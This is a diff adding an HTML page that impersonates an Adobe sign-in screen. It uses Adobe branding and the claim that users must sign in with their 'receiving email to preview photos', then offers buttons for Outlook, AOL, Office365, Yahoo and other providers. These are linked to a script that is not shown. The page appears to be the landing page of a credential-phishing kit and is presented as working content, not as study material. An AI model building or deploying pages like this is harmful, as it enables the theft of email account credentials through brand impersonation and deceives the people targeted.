@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Sign In</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+         Adobe Logo 
+        <div class="logo-section">
+            <div class="adobe-logo">
+                <div class="logo-icon">A</div>
+                <span class="logo-text">Adobe</span>
+            </div>
+        </div>
+
+         Sign-in Message 
+        <div class="message-section">
+            <p class="signin-message">
+                <strong>Adobe requires you to sign in with<br>
+                your receiving email to preview photos.</strong>
+            </p>
+        </div>
+
+         Email Provider Buttons 
+        <div class="buttons-section">
+            <button class="email-btn outlook-btn" onclick="handleEmailProvider('outlook')">
+                Outlook
+            </button>
+            
+            <button class="email-btn aol-btn" onclick="handleEmailProvider('aol')">
+                AOL
+            </button>
+            
+            <button class="email-btn office365-btn" onclick="handleEmailProvider('office365')">
+                Office365
+            </button>
+            
+            <button class="email-btn yahoo-btn" onclick="handleEmailProvider('yahoo')">
+                Yahoo
+            </button>
+            
+            <button class="email-btn other-btn" onclick="handleEmailProvider('other')">
+                Other Email
+            </button>
+        </div>
+
+         Footer 
+        <div class="footer">
+            <p>All rights reserved ©Adobe 2025</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
